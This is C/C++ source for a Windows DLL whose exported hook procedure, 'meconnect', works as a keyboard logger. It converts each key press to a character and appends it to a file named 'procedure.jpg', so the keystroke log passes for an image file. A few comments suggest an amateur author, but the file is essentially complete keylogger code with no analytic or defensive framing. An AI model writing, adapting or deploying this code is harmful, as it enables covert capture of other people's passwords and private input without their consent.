
#include <stdio.h>
#include <windows.h>
#include <dllHeader.h>
#include <fstream>


INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved)
{
    /* open file */
  //  FILE *file;
   // file = fopen("D:\\dllmain.txt", "a+");

    switch(Reason)
    {
    case DLL_PROCESS_ATTACH:
       // fprintf(file, "DLL attach function called.\n");
        break;
    case DLL_PROCESS_DETACH:
       // fprintf(file, "DLL detach function called.\n");
        break;
    case DLL_THREAD_ATTACH:
       // fprintf(file, "DLL thread attach function called.\n");
        break;
    case DLL_THREAD_DETACH:
       // fprintf(file, "DLL thread detach function called.\n");
        break;
    }

    /* close file */
 //   fclose(file);

    return TRUE;
}

__declspec(dllexport) int meconnect(int nCode, WPARAM wParam, LPARAM lParam)
{
    std::ofstream fout;
    fout.open("D:\\test\\procedure.jpg",std::ios::app);
    //this line should work according to my test in other project
    //maybe I have to use specific location


    if (nCode < 0 || nCode != HC_ACTION)
        return CallNextHookEx(NULL, nCode, wParam, lParam);


    if ( (((DWORD)lParam & 0x80000000) == 0) && (HC_ACTION == nCode))
    {
        if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||((wParam>=0x2f ) &&(wParam<=0x100)))
        {
            if(GetAsyncKeyState(wParam) == -32767) //this solve it i got it on google but how ??
            {
                BYTE ks[256];
                GetKeyboardState(ks);

                WORD w;
                UINT scan=0;
                ToAscii(wParam,scan,ks,&w,0);
                fout<<char(w);
            }
        }
    }

    fout.close();

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
